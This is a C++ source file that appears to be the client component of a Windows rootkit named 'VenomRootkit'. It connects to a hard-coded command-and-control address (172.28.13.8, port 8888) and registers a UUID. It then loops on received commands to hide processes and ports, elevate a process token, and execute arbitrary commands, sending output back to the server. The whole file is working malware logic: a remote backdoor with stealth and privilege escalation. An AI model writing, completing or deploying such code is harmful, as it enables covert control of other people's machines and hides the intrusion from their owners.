#include "CommunicationHandler.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include "../VenomRootkit/Ioctl.h"
#include "VenomClient.h"
#include "VenomCommands.h"
#include "Utils.h"

using namespace std;

//#define ERROR_MSG(msg) ::cout << msg << "Error code: " << GetLastError()

int main(int argc, const char* argv[]) {

	VenomCommands::Command recievedCommand = { 0 };
	CommunicationHandler::Communicator cncCommunicator("172.28.13.8", 8888);
	if (cncCommunicator.connectToCnc())
	{
		//cout << "connected" << endl;

		auto uuid = Utils::generateUUID();
		cncCommunicator.sendDataToCnc(uuid.c_str());

		bool status;

		while (true)
		{
			cncCommunicator.pullCommand(&recievedCommand);
			
			switch (recievedCommand.commandType)
			{

			case VenomCommands::CommandTypes::HideProcess:
				status = VenomCommands::hideProcess(*(ULONG*)recievedCommand.data);
				//cncCommunicator.sendDataToCnc()
				break;

			case VenomCommands::CommandTypes::HidePort:
				status = VenomCommands::hidePort(*(USHORT*)recievedCommand.data);
				//cncCommunicator.sendDataToCnc()
				break;

			case VenomCommands::CommandTypes::ElevateToken:
				status = VenomCommands::elevateToken(*(ULONG*)recievedCommand.data);
				//cncCommunicator.sendDataToCnc()
				break;

			case VenomCommands::CommandTypes::ExecuteCommand:
				status = VenomCommands::executeCommand(recievedCommand.data, cncCommunicator);
				//cncCommunicator.sendDataToCnc()
				break;

			default:
				//cncCommunicator.sendDataToCnc()
				break;
			}

			memset(&recievedCommand, 0, sizeof(VenomCommands::Command));
		}
	}
	else
	{
		// Activate the kill switch.
		cout << "fail" << endl;
	}
	cncCommunicator.disconnectFromCnc();

	return 0;

}
